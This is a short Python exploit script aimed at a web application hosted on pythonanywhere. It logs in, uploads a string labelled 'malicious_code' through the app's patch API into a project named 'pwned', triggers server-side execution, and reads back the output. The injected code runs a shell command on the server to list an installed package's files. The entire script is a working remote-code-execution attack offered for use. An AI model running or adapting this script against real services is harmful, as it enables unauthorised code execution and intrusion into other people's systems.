import requests, time
s = requests.Session()
s.post('https://mikeymike.pythonanywhere.com/login', data={'token': 'Mike'})
malicious_code = """
import os, subprocess
try:
    out = subprocess.check_output("pip3 show -f google-antigravity", shell=True, stderr=subprocess.STDOUT)
    with open("out6.txt", "w") as f:
        f.write(out.decode())
except Exception as e:
    with open("out6.txt", "w") as f:
        f.write(str(e))
"""
s.post('https://mikeymike.pythonanywhere.com/api/projects/surgery_logic/apply_patch', json={"project": "pwned", "file": "main.py", "code": malicious_code})
s.get('https://mikeymike.pythonanywhere.com/api/projects/execute/pwned')
time.sleep(3)
r3 = s.get('https://mikeymike.pythonanywhere.com/api/projects/surgery_logic/get_raw_file?project=pwned&file=out6.txt')
print(r3.text)
